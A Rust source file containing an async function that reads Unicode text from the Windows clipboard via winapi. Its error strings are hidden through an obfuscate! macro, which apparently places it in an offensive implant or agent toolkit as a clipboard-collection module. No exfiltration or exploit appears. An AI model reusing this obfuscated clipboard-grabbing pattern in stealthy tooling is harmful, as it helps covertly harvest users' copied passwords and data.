use anyhow::{Result, bail};
use std::ptr;
use std::slice;
use winapi::um::winuser::{OpenClipboard, CloseClipboard, GetClipboardData,CF_UNICODETEXT, IsClipboardFormatAvailable};
use winapi::um::winbase::{GlobalLock, GlobalUnlock, GlobalSize};
use winapi::shared::minwindef::HGLOBAL;
use winapi::um::errhandlingapi::GetLastError;

use crate::obfuscate;

pub async fn get() -> Result<String> {

    let mut clip_data = String::new();
    unsafe {

        if OpenClipboard(ptr::null_mut()) == 0 {
            let e = format!("{} 0x{:08X}", obfuscate!("Failed to open the clipboard : "), GetLastError());
            bail!(e);
        }
        if IsClipboardFormatAvailable(CF_UNICODETEXT) == 0 {
            let e = format!("{} 0x{:08X}", obfuscate!("No unicode text available in the clipboard : "), GetLastError());
            CloseClipboard();
            bail!(e);
        }

        let handle: HGLOBAL = GetClipboardData(CF_UNICODETEXT);
        if handle.is_null() {
            let e = format!("{} 0x{:08X}", obfuscate!("Failed to get clipboard data: "), GetLastError());
            CloseClipboard();
            bail!(e);
        }
        
        let locked_data = GlobalLock(handle);
        let data_size = GlobalSize(locked_data);
        if data_size == 0 {
            let e = format!("{} 0x{:08X}", obfuscate!("Failed to get data size: "), GetLastError());
            GlobalUnlock(handle);
            CloseClipboard();
            bail!(e);

        }

        let data_slice = slice::from_raw_parts(locked_data as *const u16, data_size/2);
        clip_data = String::from_utf16_lossy(data_slice).trim_end_matches('\0').to_string();
    	
    	GlobalUnlock(handle);
    	CloseClipboard();
    }

    Ok(clip_data)
}
